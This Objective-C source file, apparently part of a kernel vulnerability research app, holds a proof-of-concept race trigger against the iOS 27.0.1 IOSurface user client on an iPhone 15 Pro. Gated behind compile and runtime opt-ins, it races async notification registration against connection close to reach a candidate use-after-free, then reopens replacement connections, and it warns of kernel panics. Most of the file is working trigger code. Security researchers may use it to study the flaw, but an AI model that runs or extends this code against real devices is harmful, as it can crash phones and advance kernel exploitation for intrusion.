#import "KPIOSurfaceProbeModule.h"

#import <IOKit/IOKitLib.h>
#import <mach/mach.h>

#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

#ifndef KP_IOSURFACE27_ENABLE_RACE
#define KP_IOSURFACE27_ENABLE_RACE 0
#endif

#define KP_IOSURFACE_SELECTOR_LOOKUP 4
#define KP_IOSURFACE_SELECTOR_CREATE_FAST 6
#define KP_IOSURFACE_SELECTOR_SET_USE_COUNT 15
#define KP_IOSURFACE_SELECTOR_NOTIFY_ADD 17
#define KP_IOSURFACE_LOCK_RESULT_SIZE 0xc68
#define KP_IOSURFACE_NOT_READY ((kern_return_t)0xe00002d8)
#define KP_IOSURFACE_INVALID_DEST ((kern_return_t)0x10000003)

@interface KPIOSurfaceProbeModule ()
@property (nonatomic, copy, readwrite) NSString *identifier;
@property (nonatomic, copy, readwrite) NSString *title;
@property (nonatomic, copy, readwrite) NSString *subtitle;
@property (nonatomic, copy, readwrite) NSString *icon;
@property (nonatomic, assign, readwrite) KPTestSection section;
@end

typedef struct {
    uint64_t address;
    uint32_t width;
    uint32_t height;
    uint32_t pixelFormat;
    uint32_t bytesPerElement;
    uint32_t bytesPerRow;
    uint32_t allocSize;
} KPIOSurfaceFastCreateArgs;

static kern_return_t KPIOSurfaceOpen(io_connect_t *connection) {
    if (!connection) {
        return KERN_INVALID_ARGUMENT;
    }
    *connection = IO_OBJECT_NULL;
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                        IOServiceMatching("IOSurfaceRoot"));
    if (!service) {
        return kIOReturnNoDevice;
    }
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, connection);
    IOObjectRelease(service);
    return kr;
}

#if KP_IOSURFACE27_ENABLE_RACE

static kern_return_t KPIOSurfaceCreateFast(io_connect_t connection, uint32_t *surfaceID) {
    KPIOSurfaceFastCreateArgs args;
    memset(&args, 0, sizeof(args));
    args.width = 64;
    args.height = 64;
    args.pixelFormat = 0x42475241;
    args.bytesPerElement = 4;
    args.bytesPerRow = 64 * 4;
    args.allocSize = 0x4000;

    uint8_t result[KP_IOSURFACE_LOCK_RESULT_SIZE];
    memset(result, 0, sizeof(result));
    size_t resultSize = sizeof(result);
    kern_return_t kr = IOConnectCallMethod(connection,
                                           KP_IOSURFACE_SELECTOR_CREATE_FAST,
                                           NULL, 0,
                                           &args, sizeof(args),
                                           NULL, NULL,
                                           result, &resultSize);
    if (kr == KERN_SUCCESS && resultSize >= 0x1c) {
        memcpy(surfaceID, result + 0x18, sizeof(*surfaceID));
        if (*surfaceID == 0) {
            return kIOReturnError;
        }
    } else if (kr == KERN_SUCCESS) {
        return kIOReturnUnderrun;
    }
    return kr;
}

static kern_return_t KPIOSurfaceLookup(io_connect_t connection, uint32_t surfaceID) {
    uint64_t input = surfaceID;
    uint8_t result[KP_IOSURFACE_LOCK_RESULT_SIZE];
    memset(result, 0, sizeof(result));
    size_t resultSize = sizeof(result);
    kern_return_t kr = IOConnectCallMethod(connection,
                                           KP_IOSURFACE_SELECTOR_LOOKUP,
                                           &input, 1, NULL, 0,
                                           NULL, NULL, result, &resultSize);
    if (kr == KERN_SUCCESS && resultSize < 0x1c) {
        return kIOReturnUnderrun;
    }
    return kr;
}

static kern_return_t KPIOSurfaceSetUseCount(io_connect_t connection,
                                             uint32_t surfaceID,
                                             uint64_t direction) {
    uint64_t input[2] = {surfaceID, direction};
    return IOConnectCallMethod(connection, KP_IOSURFACE_SELECTOR_SET_USE_COUNT,
                               input, 2, NULL, 0,
                               NULL, NULL, NULL, NULL);
}

typedef struct {
    io_connect_t connection;
    mach_port_t wakePort;
    const uint32_t *surfaceIDs;
    uint32_t surfaceIDCount;
    atomic_int ready;
    atomic_int start;
    atomic_int stop;
    atomic_int closeIssued;
    atomic_int closeFinished;
    atomic_int lastKR;
    atomic_uint callsStarted;
    atomic_uint attempts;
    atomic_uint successes;
    atomic_uint notReady;
    atomic_uint invalidDest;
    atomic_uint otherErrors;
    atomic_uint inflightSuccess;
    atomic_uint inflightNotReady;
    atomic_uint inflightOther;
    atomic_uint lateSuccess;
    atomic_uint lateNotReady;
} KPIOSurfaceRaceContext;

typedef struct {
    KPIOSurfaceRaceContext *race;
    uint32_t threadIndex;
    uint32_t threadCount;
} KPIOSurfaceRegistrationWorker;

static void KPIOSurfaceRecordResult(KPIOSurfaceRaceContext *context, kern_return_t kr) {
    atomic_store_explicit(&context->lastKR, kr, memory_order_release);
    atomic_fetch_add_explicit(&context->attempts, 1, memory_order_relaxed);
    BOOL inflight = atomic_load_explicit(&context->closeIssued, memory_order_acquire) &&
                    !atomic_load_explicit(&context->closeFinished, memory_order_acquire);
    BOOL afterClose = atomic_load_explicit(&context->closeFinished, memory_order_acquire) != 0;
    if (kr == KERN_SUCCESS) {
        atomic_fetch_add_explicit(&context->successes, 1, memory_order_relaxed);
        if (inflight) {
            atomic_fetch_add_explicit(&context->inflightSuccess, 1, memory_order_relaxed);
        } else if (afterClose) {
            atomic_fetch_add_explicit(&context->lateSuccess, 1, memory_order_relaxed);
        }
        return;
    }
    if (kr == KP_IOSURFACE_NOT_READY) {
        atomic_fetch_add_explicit(&context->notReady, 1, memory_order_relaxed);
        if (inflight) {
            atomic_fetch_add_explicit(&context->inflightNotReady, 1, memory_order_relaxed);
        } else if (afterClose) {
            atomic_fetch_add_explicit(&context->lateNotReady, 1, memory_order_relaxed);
        }
        return;
    }
    if (inflight) {
        atomic_fetch_add_explicit(&context->inflightOther, 1, memory_order_relaxed);
    }
    if (kr == KP_IOSURFACE_INVALID_DEST) {
        atomic_fetch_add_explicit(&context->invalidDest, 1, memory_order_relaxed);
    } else {
        atomic_fetch_add_explicit(&context->otherErrors, 1, memory_order_relaxed);
    }
}

static void *KPIOSurfaceRegistrationThread(void *argument) {
    KPIOSurfaceRegistrationWorker *worker = argument;
    KPIOSurfaceRaceContext *context = worker->race;
    atomic_fetch_add_explicit(&context->ready, 1, memory_order_release);
    while (!atomic_load_explicit(&context->start, memory_order_acquire)) {
        if (atomic_load_explicit(&context->stop, memory_order_acquire)) {
            return NULL;
        }
        sched_yield();
    }
    for (uint32_t index = worker->threadIndex;
         index < context->surfaceIDCount && !atomic_load_explicit(&context->stop, memory_order_acquire);
         index += worker->threadCount) {
        uint64_t input[3] = {0, context->surfaceIDs[index], 0};
        uint64_t reference = 0x4b50000000000000ULL | index;
        atomic_fetch_add_explicit(&context->callsStarted, 1, memory_order_release);
        kern_return_t kr = IOConnectCallAsyncStructMethod(context->connection,
                                                           KP_IOSURFACE_SELECTOR_NOTIFY_ADD,
                                                           context->wakePort,
                                                           &reference, 1,
                                                           input, sizeof(input),
                                                           NULL, NULL);
        KPIOSurfaceRecordResult(context, kr);
    }
    return NULL;
}

static void KPIOSurfaceReleaseWakePort(mach_port_t wakePort) {
    if (wakePort == MACH_PORT_NULL) {
        return;
    }
    mach_port_mod_refs(mach_task_self(), wakePort, MACH_PORT_RIGHT_SEND, -1);
    mach_port_mod_refs(mach_task_self(), wakePort, MACH_PORT_RIGHT_RECEIVE, -1);
}

static BOOL KPIOSurfaceCreateWakePort(mach_port_t *port) {
    mach_port_t wakePort = MACH_PORT_NULL;
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wakePort);
    if (kr != KERN_SUCCESS) {
        return NO;
    }
    kr = mach_port_insert_right(mach_task_self(), wakePort, wakePort, MACH_MSG_TYPE_MAKE_SEND);
    if (kr != KERN_SUCCESS) {
        mach_port_mod_refs(mach_task_self(), wakePort, MACH_PORT_RIGHT_RECEIVE, -1);
        return NO;
    }
    *port = wakePort;
    return YES;
}

static void KPIOSurfaceDriveEvents(NSMutableString *report,
                                   io_connect_t helper,
                                   const uint32_t *surfaceIDs,
                                   uint32_t surfaceIDCount) {
    uint32_t use1OK = 0;
    uint32_t use0OK = 0;
    kern_return_t firstUse1Error = KERN_SUCCESS;
    kern_return_t firstUse0Error = KERN_SUCCESS;
    for (uint32_t index = 0; index < surfaceIDCount; index++) {
        kern_return_t use1 = KPIOSurfaceSetUseCount(helper, surfaceIDs[index], 1);
        if (use1 == KERN_SUCCESS) {
            use1OK++;
        } else if (firstUse1Error == KERN_SUCCESS) {
            firstUse1Error = use1;
        }
        kern_return_t use0 = KPIOSurfaceSetUseCount(helper, surfaceIDs[index], 0);
        if (use0 == KERN_SUCCESS) {
            use0OK++;
        } else if (firstUse0Error == KERN_SUCCESS) {
            firstUse0Error = use0;
        }
    }
    [report appendFormat:
     @"    event pinned=%u use(1) ok=%u/%u firstKR=0x%08x "
     @"use(0) ok=%u/%u firstKR=0x%08x\n",
     surfaceIDCount, use1OK, surfaceIDCount, (uint32_t)firstUse1Error,
     use0OK, surfaceIDCount, (uint32_t)firstUse0Error];
}

static void KPIOSurfaceRunRound(NSMutableString *report,
                                uint32_t round,
                                uint32_t *surfaceIDs) {
    enum { registrationThreadCount = 2, surfacesPerRound = 64, replacementCount = 4 };
    io_connect_t victim = IO_OBJECT_NULL;
    io_connect_t helper = IO_OBJECT_NULL;
    io_connect_t replacements[replacementCount] = {IO_OBJECT_NULL};
    mach_port_t wakePort = MACH_PORT_NULL;
    pthread_t threads[registrationThreadCount];
    KPIOSurfaceRegistrationWorker workers[registrationThreadCount];
    KPIOSurfaceRaceContext context;
    memset(&context, 0, sizeof(context));
    uint32_t created = 0;
    uint32_t pinned = 0;
    uint32_t threadsStarted = 0;
    uint32_t replacementsOpened = 0;
    BOOL synchronized = NO;
    kern_return_t closeKR = KERN_SUCCESS;
    kern_return_t kr = KPIOSurfaceOpen(&victim);
    if (kr != KERN_SUCCESS) {
        [report appendFormat:@"  round %02u: victim open failed 0x%08x\n",
         round, (uint32_t)kr];
        return;
    }
    if (!KPIOSurfaceCreateWakePort(&wakePort)) {
        [report appendFormat:@"  round %02u: wake-port creation failed\n", round];
        goto cleanup;
    }
    while (created < surfacesPerRound) {
        kr = KPIOSurfaceCreateFast(victim, &surfaceIDs[created]);
        if (kr != KERN_SUCCESS) {
            break;
        }
        created++;
    }
    if (created != surfacesPerRound) {
        [report appendFormat:@"  round %02u: only %u/%u surfaces, create kr=0x%08x\n",
         round, created, surfacesPerRound, (uint32_t)kr];
        goto cleanup;
    }

    kr = KPIOSurfaceOpen(&helper);
    if (kr != KERN_SUCCESS) {
        [report appendFormat:@"  round %02u: pin helper open failed 0x%08x\n",
         round, (uint32_t)kr];
        goto cleanup;
    }
    for (pinned = 0; pinned < created; pinned++) {
        kr = KPIOSurfaceLookup(helper, surfaceIDs[pinned]);
        if (kr != KERN_SUCCESS) {
            [report appendFormat:@"  round %02u: lookup[%u] id=%u failed 0x%08x\n",
             round, pinned, surfaceIDs[pinned], (uint32_t)kr];
            goto cleanup;
        }
    }

    context.connection = victim;
    context.wakePort = wakePort;
    context.surfaceIDs = surfaceIDs;
    context.surfaceIDCount = created;
    for (uint32_t index = 0; index < registrationThreadCount; index++) {
        workers[index].race = &context;
        workers[index].threadIndex = index;
        workers[index].threadCount = registrationThreadCount;
        int threadKR = pthread_create(&threads[index], NULL,
                                      KPIOSurfaceRegistrationThread, &workers[index]);
        if (threadKR != 0) {
            [report appendFormat:@"  round %02u: pthread_create[%u] failed %d\n",
             round, index, threadKR];
            break;
        }
        threadsStarted++;
    }
    if (threadsStarted != registrationThreadCount) {
        atomic_store_explicit(&context.stop, 1, memory_order_release);
        atomic_store_explicit(&context.start, 1, memory_order_release);
        goto join;
    }

    for (uint32_t spin = 0; spin < 100000; spin++) {
        if (atomic_load_explicit(&context.ready, memory_order_acquire) == registrationThreadCount) {
            break;
        }
        sched_yield();
    }
    if (atomic_load_explicit(&context.ready, memory_order_acquire) != registrationThreadCount) {
        [report appendFormat:@"  round %02u: registration barrier timed out\n", round];
        atomic_store_explicit(&context.stop, 1, memory_order_release);
        atomic_store_explicit(&context.start, 1, memory_order_release);
        goto join;
    }

    atomic_store_explicit(&context.start, 1, memory_order_release);
    for (uint32_t spin = 0; spin < 100000; spin++) {
        if (atomic_load_explicit(&context.callsStarted, memory_order_acquire) != 0) {
            synchronized = YES;
            break;
        }
        sched_yield();
    }
    atomic_store_explicit(&context.closeIssued, 1, memory_order_release);
    closeKR = IOServiceClose(victim);
    atomic_store_explicit(&context.closeFinished, 1, memory_order_release);
    atomic_store_explicit(&context.stop, 1, memory_order_release);

join:
    for (uint32_t index = 0; index < threadsStarted; index++) {
        pthread_join(threads[index], NULL);
    }
    if (!atomic_load_explicit(&context.closeIssued, memory_order_acquire)) {
        goto cleanup;
    }

    for (; replacementsOpened < replacementCount; replacementsOpened++) {
        kr = KPIOSurfaceOpen(&replacements[replacementsOpened]);
        if (kr != KERN_SUCCESS) {
            break;
        }
    }

    [report appendFormat:
     @"  round %02u: close=0x%08x threads=%u sync=%u attempts=%u success=%u "
     @"notReady=%u inflightSuccess=%u inflightNotReady=%u inflightOther=%u "
     @"lateSuccess=%u lateNotReady=%u invalidDest=%u otherErrors=%u "
     @"lastKR=0x%08x replacements=%u\n",
     round, (uint32_t)closeKR, threadsStarted, synchronized,
     atomic_load_explicit(&context.attempts, memory_order_relaxed),
     atomic_load_explicit(&context.successes, memory_order_relaxed),
     atomic_load_explicit(&context.notReady, memory_order_relaxed),
     atomic_load_explicit(&context.inflightSuccess, memory_order_relaxed),
     atomic_load_explicit(&context.inflightNotReady, memory_order_relaxed),
     atomic_load_explicit(&context.inflightOther, memory_order_relaxed),
     atomic_load_explicit(&context.lateSuccess, memory_order_relaxed),
     atomic_load_explicit(&context.lateNotReady, memory_order_relaxed),
     atomic_load_explicit(&context.invalidDest, memory_order_relaxed),
     atomic_load_explicit(&context.otherErrors, memory_order_relaxed),
     (uint32_t)atomic_load_explicit(&context.lastKR, memory_order_relaxed),
     replacementsOpened];

    KPIOSurfaceDriveEvents(report, helper, surfaceIDs, pinned);

cleanup:
    for (uint32_t index = 0; index < replacementsOpened; index++) {
        IOServiceClose(replacements[index]);
    }
    if (helper) {
        IOServiceClose(helper);
    }
    if (victim && !atomic_load_explicit(&context.closeFinished, memory_order_acquire)) {
        IOServiceClose(victim);
    }
    KPIOSurfaceReleaseWakePort(wakePort);
}

static NSString *KPIOSurfaceRunRace(NSMutableString *report) {
    enum { rounds = 24, surfacesPerRound = 64 };
    [report appendString:@"\n=== IOSurface 27 notify/stop race (EXPLICIT OPT-IN) ===\n"];
    [report appendString:@"Target schedule: two registration threads race stop(); events use victim IDs pinned on a helper before close.\n"];
    [report appendString:@"A kernel panic is possible. No KRW, no fresh event surfaces and no cross-type heap spray are used.\n"];

    uint32_t surfaceIDs[surfacesPerRound];
    for (uint32_t round = 0; round < rounds; round++) {
        KPIOSurfaceRunRound(report, round, surfaceIDs);
    }

    [report appendString:@"Interpretation: inflightSuccess means a selector-17 reply arrived after close started but before close returned; it is a post-purge candidate, not proof of insertion after purge.\n"];
    [report appendString:@"lateSuccess only extends the observable window and likewise is not standalone stale-node proof. inflightNotReady/lateNotReady=0xe00002d8 would demonstrate the 27.2 guard.\n"];
    [report appendString:@"Actual stale-node evidence is a consumer UAF/panic in #801/#1009, direct root+0x188 inspection showing node+0x58=freed UC, or a validated same-type notification desync. Clean rounds do not disprove the race.\n"];
    [report appendString:@"0x10000003=MACH_SEND_INVALID_DEST (expected for calls after close). The old release=0xe00002c2 path meant surface ID not found; release is no longer required to drive events.\n"];
    return report;
}

static BOOL KPIOSurfaceRaceRequested(void) {
    if ([NSUserDefaults.standardUserDefaults boolForKey:@"KexProofIOSurfaceRaceEnabled"]) {
        return YES;
    }
    NSString *value = NSProcessInfo.processInfo.environment[@"KEXPROOF_IOSURFACE27_RACE"];
    return [value isEqualToString:@"YES"];
}
#endif

@implementation KPIOSurfaceProbeModule

- (instancetype)init {
    return [self initWithArmed:NO];
}

- (instancetype)initWithArmed:(BOOL)armed {
    self = [super init];
    if (self) {
        _armed = armed;
        if (armed) {
            _identifier = @"iosurface.race";
            _title = @"IOSurface 27 Race";
            _subtitle = @"ARMED notify/stop race — may panic the kernel";
            _icon = @"exclamationmark.triangle";
        } else {
            _identifier = @"iosurface.probe";
            _title = @"IOSurface 27 Probe";
            _subtitle = @"Open/start/stop reachability; notify/stop race is double opt-in";
            _icon = @"rectangle.on.rectangle";
        }
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (NSString *)runReport {
    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV3 IOSurface 27 probe ===\n"];
    [report appendString:@"Target: iPhone16,1 (iPhone 15 Pro) / A17 Pro, iOS 27.0.1\n"];
    [report appendString:@"Candidate: IOSurfaceNotifyRequest survives UC stop and later uses stale UC pointer.\n"];
    [report appendString:@"27.2 control: UC+0xf1 stopping flag and kIOReturnNotReady (0xe00002d8).\n"];

    io_connect_t connection = IO_OBJECT_NULL;
    kern_return_t kr = KPIOSurfaceOpen(&connection);
    [report appendFormat:@"IOServiceOpen (open/start), type=0: kr=0x%08x connection=%u\n",
     (uint32_t)kr, connection];
    if (kr != KERN_SUCCESS) {
        [report appendString:@"Verdict: user-client reachability failed in this runtime profile.\n"];
        return report;
    }
    kern_return_t closeKR = IOServiceClose(connection);
    [report appendFormat:@"IOServiceClose (stop): kr=0x%08x\n", (uint32_t)closeKR];
    if (closeKR != KERN_SUCCESS) {
        [report appendString:@"Verdict: open/start succeeded, but stop did not complete cleanly.\n"];
        return report;
    }
    [report appendString:@"Baseline: open/start/stop succeeded; no selector was called and no surface was created.\n"];

#if KP_IOSURFACE27_ENABLE_RACE
    if (self.isArmed) {
        [report appendString:@"Race: ARMED via dedicated IOSurface 27 Race module.\n"];
        return KPIOSurfaceRunRace(report);
    }
    if (KPIOSurfaceRaceRequested()) {
        return KPIOSurfaceRunRace(report);
    }
    [report appendString:@"Race: built in, but disabled at runtime (use the IOSurface 27 Race module, the race switch, or KEXPROOF_IOSURFACE27_RACE=YES).\n"];
#else
    [report appendString:@"Race: NOT COMPILED (requires KP_IOSURFACE27_ENABLE_RACE=1 at build and an armed run).\n"];
#endif
    return report;
}

@end
